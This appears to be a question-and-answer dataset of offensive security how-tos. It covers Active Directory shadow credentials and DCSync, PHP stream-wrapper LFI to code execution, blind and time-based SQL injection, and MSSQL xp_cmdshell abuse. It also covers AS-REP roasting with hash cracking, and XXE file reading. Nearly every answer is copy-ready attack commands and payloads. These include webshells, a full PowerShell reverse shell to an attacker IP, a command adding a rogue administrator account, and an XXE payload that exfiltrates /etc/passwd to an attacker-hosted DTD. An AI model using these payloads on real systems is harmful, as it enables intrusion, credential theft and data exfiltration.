How do I use shadow credentials against a computer account like DC01$ to enable DCSync?

Shadow credentials on machine accounts enables PKINIT as the machine, allowing DCSync from a DC account.

Prerequisite: GenericWrite/GenericAll over DC01$ or any computer account.

Auto attack against DC01$:
certipy shadow auto -u jsmith@corp.local -p 'Password123!' -account 'DC01$' -dc-ip 192.168.1.10
# Gets DC01$'s NT hash and TGT

Manual steps:
certipy shadow add -u jsmith@corp.local -p 'Password123!' -account 'DC01$' -dc-ip 192.168.1.10
certipy auth -pfx 'dc01$.pfx' -username 'DC01$' -domain corp.local -dc-ip 192.168.1.10
# NT hash for 'dc01$': 4b72e337f5e8ba40c5e1a7e0e92dd1be

Use machine TGT for DCSync:
export KRB5CCNAME='dc01$.ccache'
python3 /opt/impacket/examples/secretsdump.py -k -no-pass corp.local/'DC01$'@dc01.corp.local

Or use NT hash:
python3 /opt/impacket/examples/secretsdump.py -hashes :4b72e337f5e8ba40c5e1a7e0e92dd1be corp.local/'DC01$'@192.168.1.10

Cleanup shadow credential:
certipy shadow remove -u jsmith@corp.local -p 'Password123!' -account 'DC01$' -device-id <DEVICE-GUID> -dc-ip 192.168.1.10

If certipy auth fails with KDC_ERR_CLIENT_NOT_TRUSTED, verify PKINIT is enabled on DC and the CA cert chain is valid.

How do I use PHP stream wrappers to escalate LFI to RCE and read source code?

PHP wrapper exploitation via LFI:

Read PHP source code (base64 to avoid execution):
http://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php
http://target.com/page.php?file=php://filter/convert.base64-encode/resource=../config.php
# Decode: echo 'BASE64OUTPUT' | base64 -d

Chained filters (bypass filter stripping):
http://target.com/page.php?file=php://filter/read=convert.base64-encode|convert.base64-encode/resource=index.php

RCE via data:// wrapper (requires allow_url_include = On):
http://target.com/page.php?file=data://text/plain,<?php system('id'); ?>
http://target.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
# base64 of: <?php system($_GET['cmd']); ?>

expect:// (if expect module loaded):
http://target.com/page.php?file=expect://id

zip:// with uploaded archive:
# Create: zip shell.zip shell.php (shell.php = webshell)
# Upload shell.zip via any file upload
http://target.com/page.php?file=zip:///var/www/uploads/shell.zip%23shell

phar:// deserialization gadget:
php -r "$p=new Phar('shell.phar');$p->addFromString('t.php','<?php system(\$_GET[chr(99)]);?>');$p->setStub('<?php __HALT_COMPILER();?>');rename('shell.phar','shell.jpg');"
# Upload shell.jpg
http://target.com/page.php?file=phar:///var/www/uploads/shell.jpg/t.php&c=id

php://input RCE (POST body as PHP):
curl -s 'http://target.com/page.php?file=php://input' --data '<?php system("id"); ?>'

How do I manually test for boolean-based blind SQL injection on a login form?

Test by injecting boolean conditions and observing behavioral differences:

1. Baseline request:
   POST /login  username=admin&password=test

2. True condition (should succeed like normal invalid login):
   username=admin' AND '1'='1'--&password=test

3. False condition (may behave differently):
   username=admin' AND '1'='2'--&password=test

4. Extract data character by character:
   username=admin' AND SUBSTRING(database(),1,1)='a'--
   username=admin' AND SUBSTRING(database(),1,1)='b'--

5. Automate with sqlmap:
   sqlmap -u "http://target.com/login" --data="username=admin&password=test" -p username --technique=B --level=3 --risk=2 --batch --dbs

6. Once DB found, dump tables:
   sqlmap -u "http://target.com/login" --data="username=admin&password=test" -p username -D targetdb --tables --batch

Key indicator: different response length, redirect, or timing between true/false payloads.

How do I exploit MSSQL injection to enable xp_cmdshell and achieve OS command execution?

MSSQL stacked queries — requires stacked query support (most MSSQL connectors support it).

Step 1 — Enable advanced options + xp_cmdshell:
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;-- -
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -

One-liner:
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -

Step 2 — Execute OS commands:
'; EXEC xp_cmdshell 'whoami';-- -
'; EXEC xp_cmdshell 'ipconfig /all';-- -
'; EXEC xp_cmdshell 'net user';-- -

Step 3 — Add admin user:
'; EXEC xp_cmdshell 'net user hacker P@ssword123! /add && net localgroup administrators hacker /add';-- -

Step 4 — Reverse shell via PowerShell:
'; EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient(''192.168.1.50'',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+''PS ''+(pwd).Path+''>  '';$sb3=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"';-- -

sqlmap automated OS shell:
sqlmap -u 'http://target.com/page?id=1' --dbms=mssql --os-shell --batch

UNC path for NTLM capture:
'; EXEC xp_dirtree '\\192.168.1.50\share';-- -

How do I perform a shadow credentials attack with certipy to take over a user account in CORP.LOCAL?

Shadow credentials abuses write access to msDS-KeyCredentialLink to perform PKINIT auth as the target.

Prerequisite: GenericWrite or GenericAll over target user/computer account.

Auto mode (adds credential, gets hash, cleans up):
certipy shadow auto -u jsmith@corp.local -p 'Password123!' -account targetuser -dc-ip 192.168.1.10
# Output:
# [*] Targeting user 'targetuser'
# [*] Generating certificate
# [*] Adding Key Credential with device ID 'abc123...' to 'targetuser'
# [*] Authenticating as 'targetuser' with the certificate
# [*] NT hash for 'targetuser': 8846f7eaee8fb117ad06bdd830b7586c
# [*] Restored the msDS-KeyCredentialLink attribute of the 'targetuser' user

Manual step-by-step:
# Add shadow credential:
certipy shadow add -u jsmith@corp.local -p 'Password123!' -account targetuser -dc-ip 192.168.1.10
# Authenticate with generated cert:
certipy auth -pfx targetuser.pfx -domain corp.local -dc-ip 192.168.1.10
# Clean up after getting hash:
certipy shadow remove -u jsmith@corp.local -p 'Password123!' -account targetuser -device-id <DEVICE-GUID> -dc-ip 192.168.1.10

List current credentials on target:
certipy shadow list -u jsmith@corp.local -p 'Password123!' -account targetuser -dc-ip 192.168.1.10

Use recovered hash for PTH:
evil-winrm -i 192.168.1.20 -u targetuser -H 8846f7eaee8fb117ad06bdd830b7586c

How do I find and AS-REP roast accounts that don't require Kerberos pre-authentication in CORP.LOCAL?

AS-REP roasting targets accounts with 'Do not require Kerberos preauthentication' set.

With credentials (auto-enumerate all vulnerable accounts):
python3 /opt/impacket/examples/GetNPUsers.py corp.local/jsmith:'Password123!' -dc-ip 192.168.1.10 -request -format hashcat -outputfile asrep.txt

Without credentials (need valid username list):
python3 /opt/impacket/examples/GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -no-pass -format hashcat -outputfile asrep.txt

Output hash format:
$krb5asrep$23$asreproast_user@CORP.LOCAL:8f3a2b49c0e...<snip>

Target a specific known user:
python3 /opt/impacket/examples/GetNPUsers.py corp.local/nopreauth_user -no-pass -dc-ip 192.168.1.10 -format hashcat

Crack with hashcat (mode 18200 = AS-REP RC4):
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

Crack with john:
john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep

What are the exact MySQL time-based blind SQLi payloads to detect injection and extract the database name?

MySQL time-based blind SQLi — inference via response delay.

Detection (true = 5-second delay, false = instant):
' AND SLEEP(5)-- -
1 AND SLEEP(5)-- -
' AND SLEEP(5) AND '1'='1
1; WAITFOR DELAY '0:0:5'-- -  (MSSQL variant)

Boolean-based test:
' AND IF(1=1,SLEEP(5),0)-- -     ← delays (true)
' AND IF(1=2,SLEEP(5),0)-- -     ← instant (false)

Extract database name length:
' AND IF(LENGTH(database())=6,SLEEP(5),0)-- -

Extract database name char by char:
' AND IF(SUBSTRING(database(),1,1)='c',SLEEP(5),0)-- -
' AND IF(SUBSTRING(database(),2,1)='o',SLEEP(5),0)-- -
' AND IF(ASCII(SUBSTRING(database(),1,1))>99,SLEEP(5),0)-- -  ← binary search

Extract first table name:
' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u',SLEEP(5),0)-- -

Extract password from users table:
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='5',SLEEP(5),0)-- -

BENCHMARK alternative (CPU-based, no SLEEP privilege needed):
' AND BENCHMARK(10000000,MD5('a'))-- -

sqlmap time-based:
sqlmap -u 'http://target.com/page?id=1' --technique=T --dbms=MySQL --level=5 --risk=3 --time-sec=5 --dbs

How do I exploit XXE to read local files and perform out-of-band data exfiltration?

Classic XXE file read (in-band — server reflects file content):

Linux /etc/passwd:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>

Windows hosts file:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>
<root>&xxe;</root>

PHP source via php:// wrapper:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]>
<foo>&xxe;</foo>
# Decode: echo 'BASE64' | base64 -d

Blind XXE via out-of-band DNS exfiltration (host evil.dtd on attacker):
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.50/evil.dtd">%xxe;]>
<foo>test</foo>

evil.dtd content (attacker hosts at http://192.168.1.50/evil.dtd):
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://192.168.1.50/?d=%file;'>">
%eval;
%exfil;

Catch on attacker:
python3 -m http.server 80
# /var/log/apache2/access.log shows URL-encoded file contents
